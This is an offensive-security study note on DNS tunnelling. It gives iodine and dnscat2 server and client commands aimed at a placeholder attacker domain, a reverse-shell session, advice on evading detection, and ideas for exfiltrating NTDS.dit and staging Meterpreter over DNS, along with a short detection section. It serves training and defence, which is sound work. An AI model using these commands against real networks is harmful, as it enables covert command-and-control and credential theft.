---
topic: "73.09 DNS Tunneling Iodine dnscat2"
date: 2026-06-09
author: 'Antigravity'
tags: [network, advanced, pivoting, evasion, vapt]
difficulty: advanced
module: "73 - Advanced Network Pivoting Tunnels and Evasion"
---

# 73.09 DNS Tunneling Iodine dnscat2

## 1. Introduction to DNS Tunneling
In highly secure, air-gapped, or aggressively segmented environments (such as PCI-DSS compliant zones or corporate DMZs), outbound TCP, UDP, and ICMP traffic are often completely blackholed. However, an environment still needs to resolve domain names to function.
DNS is a hierarchical, decentralized protocol. When a compromised host requests a DNS resolution for an unknown domain, the internal DNS server recursively forwards that request to the authoritative name server on the internet.
**DNS Tunneling** exploits this recursion. The attacker registers a domain and sets up a malicious authoritative name server. The compromised host wraps its C2 payload inside legitimate DNS query fields (like subdomains) and sends it to the local DNS server. The local server forwards it to the attacker's server, bypassing the firewall entirely.

## 2. Protocol Mechanics & Record Types
DNS Tunneling relies on specific DNS record types to maximize the amount of payload data transmitted per packet:
- **TXT Records**: Originally designed for human-readable text, they allow up to 255 characters of arbitrary string data. This is the primary vehicle for downloading data from the C2.
- **CNAME / A / AAAA Records**: Used for sending data from the compromised host to the C2 by encoding the payload in the subdomain string (e.g., `base64_payload.attacker.com`).
- **NULL Records**: Allow arbitrary binary data up to 65535 bytes, providing the highest bandwidth, though often blocked or unsupported by strict DNS resolvers.

## 3. ASCII Diagram: DNS Recursion Evasion

```text
      [ Compromised Host ]
      IP: 10.0.0.5 (No Internet Access)
             |
             |  Query: TXT base64_data.evil.com
             v
    +----------------------------------+
    | Corporate Internal DNS Resolver  |
    | IP: 10.0.0.2                     |
    +----------------------------------+
             |
             |  [ FW allows outbound DNS on UDP 53 ]
             |  Recursion: "Where is evil.com?"
             v
    +----------------------------------+
    | Root / TLD DNS Servers (.com)    |
    | "evil.com is managed by NS1..."  |
    +----------------------------------+
             |
             v
    +----------------------------------+
    | Attacker C2 (Authoritative NS)   |
    | IP: 203.0.113.5 (ns1.evil.com)   |
    | Running: iodine or dnscat2       |
    +----------------------------------+
```

## 4. Deep Dive: Iodine (IP over DNS)

### 4.1 What is Iodine?
`iodine` creates a virtual network interface (TUN/TAP) on both the attacker and the compromised machine. It then establishes a fully functional layer-3 IPv4 tunnel routed entirely over DNS requests.

### 4.2 Server Setup (Attacker C2)
1. Register a domain (e.g., `evil.com`).
2. Set an `A` record for `ns1.evil.com` pointing to the Attacker C2 IP (203.0.113.5).
3. Set an `NS` record for `tunnel.evil.com` pointing to `ns1.evil.com`.
4. Run `iodined` on the Attacker C2 (requires root to create TUN interface):
```bash
# iodined -f -c -P <password> <tunnel_IP_range> <domain>
sudo iodined -f -c -P securepass123 10.99.99.1 tunnel.evil.com
```

### 4.3 Client Setup (Compromised Host)
Deploy the `iodine` binary to the target. Execute the client pointing to the domain:
```bash
sudo iodine -f -P securepass123 tunnel.evil.com
```
Once connected, both machines will have a `dns0` interface. The attacker will be `10.99.99.1`, and the victim will be `10.99.99.2`. You can now run any TCP/UDP tool (like SSH, Nmap) over this subnet.

## 5. Deep Dive: dnscat2 (C2 over DNS)

### 5.1 What is dnscat2?
While `iodine` provides a full IP tunnel (high bandwidth, high noise), `dnscat2` is a command-and-control framework built specifically to operate over DNS. It does not require root privileges on the client and is optimized for stealthy, interactive reverse shells rather than full layer-3 routing.

### 5.2 Server Setup
```bash
ruby dnscat2.rb tunnel.evil.com
```

### 5.3 Client Setup
```bash
./dnscat --dns domain=tunnel.evil.com
```
Within the dnscat2 server console, a new session is created. You can interact with it to spawn a shell:
```bash
dnscat2> session -i 1
dnscat2> shell
```

## 6. Performance and Limitations
- **Bandwidth**: DNS tunneling is excruciatingly slow. `iodine` might max out at 50-100 Kbps in ideal conditions.
- **Latency**: Every packet requires full DNS recursion. Round-trip times can exceed 500ms.
- **Timeouts**: SSH sessions over DNS frequently drop due to DNS timeout restrictions. Always use tools like `tmux` or `screen` to preserve terminal state.
- **Caching**: Aggressive internal DNS caching can break bidirectional tunnels. Tools combat this by generating randomized, unique subdomains for every single packet.

## 7. Advanced Evasion and OpSec

### 7.1 DNS Request Throttling
A typical compromised host generating 500 DNS requests per second to a single domain is a massive red flag.
Configure `dnscat2` with delays to blend into normal traffic.
```bash
./dnscat --dns domain=tunnel.evil.com,delay=1000
```
*(This limits requests to 1 per second, making the shell incredibly slow but highly stealthy).*

### 7.2 Domain Reputation
EDR and NGFWs check the reputation and age of domains. Do not register a domain and use it for tunneling on the same day. Buy aged domains, or categorize them through proxy services to bypass basic reputation filters.

## 8. Detection and Mitigation

### 8.1 Network Level Detection
- **Query Length**: Look for unusually long subdomains (e.g., `A93B2F1...C.tunnel.evil.com`). Legitimate subdomains rarely exceed 20 characters.
- **Query Volume**: A massive spike in `TXT` or `NULL` record requests from a single source IP.
- **Unique FQDNs**: Alert if a host queries thousands of unique subdomains for a single top-level domain within a short timeframe.

### 8.2 Host Level Detection
- Alert on the creation of `TUN/TAP` interfaces by unknown or unprivileged users.
- Baseline DNS resolution on servers. A database server should not be performing hundreds of external DNS lookups.

## 9. Comprehensive Configuration Cheatsheet

### dnscat2 Advanced Client Flags
| Flag | Description |
|------|-------------|
| `--dns server=X` | Bypass local resolver and send directly to specific IP. |
| `--dns port=X` | Use non-standard DNS port (if internal firewall permits). |
| `--secret=X` | Enable end-to-end encryption for the payload. |
| `--no-cache` | Prevents the client from caching responses. |

## 10. Chaining Opportunities
- **Active Directory Exfiltration**: Use `dnscat2`'s built-in file download commands to stealthily exfiltrate the `NTDS.dit` file over the course of several days, bypassing DLP (Data Loss Prevention) mechanisms that only monitor HTTP/SMTP.
- **Stage 2 Loader**: Use a tiny, memory-resident DNS client to pull a larger, encrypted Meterpreter payload via TXT records, avoiding HTTP web proxies entirely.

## 11. Related Notes
- [[08 - ICMP Tunneling PingTunnel]]
- [[10 - Bypassing Firewalls via Egress Testing]]
- [[14 - Evasion via Living Off The Land (LOLBins)]]
- [[16 - Advanced Data Exfiltration Tactics]]
